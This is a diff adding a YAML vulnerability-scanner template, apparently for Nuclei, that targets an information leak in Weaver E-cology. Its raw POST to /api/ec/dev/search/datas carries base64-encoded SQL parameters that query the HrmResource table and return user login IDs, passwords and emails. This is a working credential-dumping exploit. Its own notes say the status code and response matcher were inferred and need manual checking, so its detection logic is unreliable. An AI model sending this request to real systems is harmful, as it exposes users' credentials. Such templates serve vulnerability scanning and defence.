@@ -1,0 +1,44 @@
+id: poc-ewnkvwobv36sg9ua
+info:
+  name: 泛微 E-cology datas 存在敏感信息泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ewnkvwobv36sg9ua
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ewnkvwobv36sg9ua
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /api/ec/dev/search/datas HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    ^(?=.*?datas)(?=.*?id)(?=.*?password).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
